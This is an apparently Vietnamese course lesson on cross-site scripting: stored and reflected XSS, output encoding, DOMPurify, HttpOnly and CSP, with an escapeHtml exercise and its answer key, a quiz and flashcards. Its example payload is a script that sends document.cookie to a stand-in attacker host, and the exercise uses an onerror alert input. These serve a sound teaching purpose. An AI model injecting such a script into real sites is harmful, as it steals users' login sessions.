---
title: XSS: chèn mã JavaScript
chapter: Chèn mã phía trình duyệt
summary: Stored, reflected XSS và mã hóa đầu ra.
duration: 15
---
## Kịch bản

Học viên đăng bình luận:

```html
<script>fetch('https://ke-xau.vn/?c=' + document.cookie)</script>
```

Nếu trang hiển thị bình luận bằng `innerHTML`, mọi người xem đều chạy đoạn mã này: lộ phiên đăng nhập, bị đổi giao diện, bị gửi request thay mặt.

- **Stored XSS**: mã độc lưu trong CSDL (bình luận, tên người dùng).
- **Reflected XSS**: mã độc nằm trên URL, ví dụ `?q=<script>…`.

## Phòng chống

- **Mã hóa đầu ra**: đổi `<` thành `&lt;`… React `{text}`, Blade `{{ $text }}`, PHP `htmlspecialchars` đều tự làm.
- Tránh `dangerouslySetInnerHTML`, `{!! $html !!}`, `innerHTML` với dữ liệu người dùng; bắt buộc dùng thì lọc qua thư viện như DOMPurify.
- Cookie `HttpOnly`, header `Content-Security-Policy` để giảm thiệt hại.

```code javascript
@instructions Viết hàm `escapeHtml(text)` đổi 5 ký tự đặc biệt `&`, `<`, `>`, `"`, `'` thành thực thể HTML (`&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#39;`).
@starter
function escapeHtml(text) {
}
console.log(escapeHtml(`<img src=x onerror="alert('XSS')">`))
@solution
function escapeHtml(text) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }
  return text.replace(/[&<>"']/g, (ch) => map[ch])
}
console.log(escapeHtml(`<img src=x onerror="alert('XSS')">`))
@expected
&lt;img src=x onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;
```

```quiz quick
? Cách hiển thị nào trong React an toàn với dữ liệu người dùng?
* <p>{comment}</p>
- <p dangerouslySetInnerHTML={{ __html: comment }} />
- element.innerHTML = comment
> React tự mã hóa nội dung trong { }.
```

## Tổng kết

```flashcard
XSS :: Chèn mã JavaScript vào trang người khác xem
Stored XSS :: Mã độc lưu trong CSDL
Mã hóa đầu ra :: Đổi ký tự HTML đặc biệt thành thực thể
Content-Security-Policy :: Header giới hạn nguồn script được chạy
```
